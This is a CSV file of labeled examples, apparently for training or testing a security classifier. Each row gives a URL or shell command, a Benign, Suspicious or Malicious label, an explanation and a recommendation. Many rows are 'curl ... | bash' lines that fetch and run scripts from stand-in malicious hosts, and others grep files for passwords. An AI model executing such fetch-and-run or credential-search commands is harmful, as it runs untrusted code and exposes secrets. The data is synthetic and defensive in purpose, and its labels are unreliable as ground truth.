Prompt,Label,Explanation,Recommendation
http://www.techlimits.com/downloads/476-vectorworks-architect-designer-demo?platform=win,Malicious,"Website shows signs of being defaced, likely due to a previous breach.",Alert web administrator and assess for unauthorized changes or backdoors.
hawaii.edu/intlrel/pols320/Text/Theory/easton.htm,Benign,Legitimate URL with no signs of malicious content or suspicious activity.,No action required.
http://torcache.net/torrent/5FF9510F8A09D90A29D417D9D3576C27C519CEC0.torrent?title=[kickass.to]focus.2015.720p.web.dl.dd5.1.h264.rarbg,Benign,Legitimate URL with no signs of malicious content or suspicious activity.,No action required.
donshelbybook.com/,Benign,Legitimate URL with no signs of malicious content or suspicious activity.,No action required.
spoke.com/dir/p/fitzsimmons/tom,Benign,Legitimate URL with no signs of malicious content or suspicious activity.,No action required.
universalpsa.org/,Benign,Legitimate URL with no signs of malicious content or suspicious activity.,No action required.
http://michaelgoczol.de/hp/gallery/advertising/george_v_paris,Malicious,"Website shows signs of being defaced, likely due to a previous breach.",Alert web administrator and assess for unauthorized changes or backdoors.
grep 'password' ~/docs/note16.txt,Suspicious,"Searching for password strings in text files, which could indicate poor security practices or reconnaissance.",Encourage use of secure password managers and audit file access.
curl http://malicious-server35.biz/payload35.sh | bash,Malicious,Downloads and runs a potentially malicious script from a suspicious external server.,Block the domain and isolate the system for further analysis.
curl http://malicious-server0.biz/payload0.sh | bash,Malicious,Downloads and runs a potentially malicious script from a suspicious external server.,Block the domain and isolate the system for further analysis.
grep 'password' ~/docs/note53.txt,Suspicious,"Searching for password strings in text files, which could indicate poor security practices or reconnaissance.",Encourage use of secure password managers and audit file access.
cd ~/work/reports60,Benign,Changes directory into a user workspace; this is standard and benign behavior.,No action needed.
cd ~/work/reports46,Benign,Changes directory into a user workspace; this is standard and benign behavior.,No action needed.
cd ~/work/reports41,Benign,Changes directory into a user workspace; this is standard and benign behavior.,No action needed.
curl http://malicious-server47.biz/payload47.sh | bash,Malicious,Downloads and runs a potentially malicious script from a suspicious external server.,Block the domain and isolate the system for further analysis.
curl http://malicious-server13.biz/payload13.sh | bash,Malicious,Downloads and runs a potentially malicious script from a suspicious external server.,Block the domain and isolate the system for further analysis.
grep 'password' ~/docs/note62.txt,Suspicious,"Searching for password strings in text files, which could indicate poor security practices or reconnaissance.",Encourage use of secure password managers and audit file access.
grep 'password' ~/docs/note15.txt,Suspicious,"Searching for password strings in text files, which could indicate poor security practices or reconnaissance.",Encourage use of secure password managers and audit file access.
grep 'password' ~/docs/note19.txt,Suspicious,"Searching for password strings in text files, which could indicate poor security practices or reconnaissance.",Encourage use of secure password managers and audit file access.
cd ~/work/reports43,Benign,Changes directory into a user workspace; this is standard and benign behavior.,No action needed.
curl http://malicious-server32.biz/payload32.sh | bash,Malicious,Downloads and runs a potentially malicious script from a suspicious external server.,Block the domain and isolate the system for further analysis.
curl http://malicious-server53.biz/payload53.sh | bash,Malicious,Downloads and runs a potentially malicious script from a suspicious external server.,Block the domain and isolate the system for further analysis.
cd ~/work/reports57,Benign,Changes directory into a user workspace; this is standard and benign behavior.,No action needed.
curl http://malicious-server38.biz/payload38.sh | bash,Malicious,Downloads and runs a potentially malicious script from a suspicious external server.,Block the domain and isolate the system for further analysis.
curl http://malicious-server7.biz/payload7.sh | bash,Malicious,Downloads and runs a potentially malicious script from a suspicious external server.,Block the domain and isolate the system for further analysis.
cd ~/work/reports37,Benign,Changes directory into a user workspace; this is standard and benign behavior.,No action needed.
grep 'password' ~/docs/note30.txt,Suspicious,"Searching for password strings in text files, which could indicate poor security practices or reconnaissance.",Encourage use of secure password managers and audit file access.
curl http://malicious-server56.biz/payload56.sh | bash,Malicious,Downloads and runs a potentially malicious script from a suspicious external server.,Block the domain and isolate the system for further analysis.
curl http://malicious-server1.biz/payload1.sh | bash,Malicious,Downloads and runs a potentially malicious script from a suspicious external server.,Block the domain and isolate the system for further analysis.
cd ~/work/reports34,Benign,Changes directory into a user workspace; this is standard and benign behavior.,No action needed.
grep 'password' ~/docs/note46.txt,Suspicious,"Searching for password strings in text files, which could indicate poor security practices or reconnaissance.",Encourage use of secure password managers and audit file access.
cd ~/work/reports2,Benign,Changes directory into a user workspace; this is standard and benign behavior.,No action needed.
curl http://malicious-server43.biz/payload43.sh | bash,Malicious,Downloads and runs a potentially malicious script from a suspicious external server.,Block the domain and isolate the system for further analysis.
curl http://malicious-server57.biz/payload57.sh | bash,Malicious,Downloads and runs a potentially malicious script from a suspicious external server.,Block the domain and isolate the system for further analysis.
grep 'password' ~/docs/note32.txt,Suspicious,"Searching for password strings in text files, which could indicate poor security practices or reconnaissance.",Encourage use of secure password managers and audit file access.
cd ~/work/reports54,Benign,Changes directory into a user workspace; this is standard and benign behavior.,No action needed.
curl http://malicious-server5.biz/payload5.sh | bash,Malicious,Downloads and runs a potentially malicious script from a suspicious external server.,Block the domain and isolate the system for further analysis.
cd ~/work/reports26,Benign,Changes directory into a user workspace; this is standard and benign behavior.,No action needed.
cd ~/work/reports48,Benign,Changes directory into a user workspace; this is standard and benign behavior.,No action needed.
curl http://malicious-server41.biz/payload41.sh | bash,Malicious,Downloads and runs a potentially malicious script from a suspicious external server.,Block the domain and isolate the system for further analysis.
cd ~/work/reports4,Benign,Changes directory into a user workspace; this is standard and benign behavior.,No action needed.
grep 'password' ~/docs/note40.txt,Suspicious,"Searching for password strings in text files, which could indicate poor security practices or reconnaissance.",Encourage use of secure password managers and audit file access.
cd ~/work/reports39,Benign,Changes directory into a user workspace; this is standard and benign behavior.,No action needed.
cd ~/work/reports20,Benign,Changes directory into a user workspace; this is standard and benign behavior.,No action needed.
grep 'password' ~/docs/note52.txt,Suspicious,"Searching for password strings in text files, which could indicate poor security practices or reconnaissance.",Encourage use of secure password managers and audit file access.
grep 'password' ~/docs/note55.txt,Suspicious,"Searching for password strings in text files, which could indicate poor security practices or reconnaissance.",Encourage use of secure password managers and audit file access.
grep 'password' ~/docs/note39.txt,Suspicious,"Searching for password strings in text files, which could indicate poor security practices or reconnaissance.",Encourage use of secure password managers and audit file access.
grep 'password' ~/docs/note37.txt,Suspicious,"Searching for password strings in text files, which could indicate poor security practices or reconnaissance.",Encourage use of secure password managers and audit file access.
cd ~/work/reports15,Benign,Changes directory into a user workspace; this is standard and benign behavior.,No action needed.
curl http://malicious-server37.biz/payload37.sh | bash,Malicious,Downloads and runs a potentially malicious script from a suspicious external server.,Block the domain and isolate the system for further analysis.
cd ~/work/reports16,Benign,Changes directory into a user workspace; this is standard and benign behavior.,No action needed.
grep 'password' ~/docs/note34.txt,Suspicious,"Searching for password strings in text files, which could indicate poor security practices or reconnaissance.",Encourage use of secure password managers and audit file access.
grep 'password' ~/docs/note3.txt,Suspicious,"Searching for password strings in text files, which could indicate poor security practices or reconnaissance.",Encourage use of secure password managers and audit file access.
grep 'password' ~/docs/note10.txt,Suspicious,"Searching for password strings in text files, which could indicate poor security practices or reconnaissance.",Encourage use of secure password managers and audit file access.
cd ~/work/reports36,Benign,Changes directory into a user workspace; this is standard and benign behavior.,No action needed.
curl http://malicious-server12.biz/payload12.sh | bash,Malicious,Downloads and runs a potentially malicious script from a suspicious external server.,Block the domain and isolate the system for further analysis.
curl http://malicious-server64.biz/payload64.sh | bash,Malicious,Downloads and runs a potentially malicious script from a suspicious external server.,Block the domain and isolate the system for further analysis.
cd ~/work/reports31,Benign,Changes directory into a user workspace; this is standard and benign behavior.,No action needed.
cd ~/work/reports21,Benign,Changes directory into a user workspace; this is standard and benign behavior.,No action needed.
